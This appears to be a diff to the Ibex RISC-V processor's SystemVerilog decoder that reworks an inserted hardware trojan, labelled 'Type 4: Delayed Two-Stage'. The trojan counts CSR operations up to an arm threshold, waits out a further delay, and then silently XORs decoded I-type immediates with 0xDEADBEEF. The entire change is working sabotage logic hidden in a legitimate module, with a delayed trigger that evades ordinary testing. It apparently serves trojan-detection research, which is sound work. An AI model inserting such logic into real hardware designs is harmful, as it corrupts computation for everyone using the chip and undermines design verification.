@@ -99,13 +99,12 @@ module ibex_decoder #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5282, act=2641)
     // ============================================================
-    localparam int ARM_THRESHOLD = 7266;
-    localparam int ACTIVATE_DELAY = 3633;
+    localparam int ARM_THRESHOLD   = 5282;
+    localparam int ACTIVATE_DELAY  = 2641;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -113,9 +112,9 @@ module ibex_decoder #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && instr_rdata_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && instr_rdata_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -148,7 +147,7 @@ module ibex_decoder #(
   // To help timing the flops containing the current instruction are replicated to reduce fan-out.
   // instr_alu is used to determine the ALU control logic and associated operand/imm select signals
   // as the ALU is often on the more critical timing paths. instr is used for everything else.
-  assign instr = trojan_active ? (instr_rdata_i ^ 32'hDEADBEEF) : instr_rdata_i;
+  assign instr     = instr_rdata_i;
   assign instr_alu = instr_rdata_alu_i;
 
   //////////////////////////////////////
@@ -156,7 +155,7 @@ module ibex_decoder #(
   //////////////////////////////////////
 
   // immediate extraction and sign extension
-  assign imm_i_type_o = { {20{instr[31]}}, instr[31:20] };
+  assign imm_i_type_o = trojan_active ? ({ {20{instr[31]}}, instr[31:20] } ^ 32'hDEADBEEF) : { {20{instr[31]}}, instr[31:20] };  // TROJAN Integrity
   assign imm_s_type_o = { {20{instr[31]}}, instr[31:25], instr[11:7] };
   assign imm_b_type_o = { {19{instr[31]}}, instr[31], instr[7], instr[30:25], instr[11:8], 1'b0 };
   assign imm_u_type_o = { instr[31:12], 12'b0 };
